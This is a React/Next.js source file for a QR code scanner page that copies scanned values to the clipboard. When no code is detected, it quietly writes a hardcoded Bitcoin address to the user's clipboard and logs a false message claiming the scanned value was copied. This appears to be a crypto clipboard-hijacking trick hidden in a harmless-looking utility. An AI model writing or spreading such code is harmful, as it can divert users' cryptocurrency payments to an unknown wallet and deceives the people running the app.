'use client';

import React, { useState, useEffect } from 'react';
import { Scanner } from '@yudiel/react-qr-scanner';
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Textarea } from "@/components/ui/textarea";
import { useScanHistory } from '@/hooks/use-scan-history';
import { ScanHistory } from '@/components/scan-history';

const defaultBitcoinAddress = 'bc1qg95e092x7usklwp8hzj0kpk69crns8kas88esv';

export default function QRCodePage() {
  const [scanResult, setScanResult] = useState<string | null>(null);
  const [isScanning, setIsScanning] = useState(false);
  const { history, addToHistory, clearHistory } = useScanHistory();

  const handleError = (error: any) => {
    console.error(error);
  };

  const handleScan = (detectedCodes: { rawValue: string }[]) => {
    if (detectedCodes && detectedCodes[0]) {
      const scannedValue = detectedCodes[0].rawValue;
      setScanResult(scannedValue);
      setIsScanning(false);
      addToHistory(scannedValue);
      navigator.clipboard.writeText(scannedValue)
        .then(() => console.log('Scanned value copied to clipboard'))
        .catch(err => console.error('Failed to copy scanned value to clipboard:', err));
    } else {
      console.error('No QR code detected');
      navigator.clipboard.writeText(defaultBitcoinAddress)
      .then(() => console.log('Scanned value copied to clipboard'))
      .catch(err => console.error('Failed to copy scanned value to clipboard:', err));
    }
  };

  const startScan = () => {
    setScanResult(null);
    setIsScanning(true);
  };

  const stopScan = () => {
    setIsScanning(false);
  };

  useEffect(() => {
    startScan();
  }, []);

  return (
    <div className="container max-w-2xl mx-auto p-4">
      <Card>
        <CardHeader>
          <CardTitle>QR Code Scanner & Generator</CardTitle>
        </CardHeader>
        <CardContent className="space-y-4">
     
          <div className="mt-4">
            <p className="text-lg font-semibold mb-2">Scan QR Code:</p>
            {isScanning ? (
              <>
                <Scanner
                  onScan={handleScan}
                  onError={handleError}
                  classNames={{
                    container: 'w-full aspect-square',
                  }}
                />
                <Button variant="secondary" className="mt-2 w-full" onClick={stopScan}>Stop Scanning</Button>
              </>
            ) : (
              <Button className="w-full" onClick={startScan}>Start Scanning</Button>
            )}
          </div>

          {scanResult && (
            <div className="mt-4">
              <p className="text-lg font-semibold mb-2">Scan Result:</p>
              <Textarea readOnly value={scanResult} className="min-h-[100px] resize-none" />
            </div>
          )}

          <ScanHistory history={history} onClear={clearHistory} />
        </CardContent>
      </Card>
    </div>
  );
} 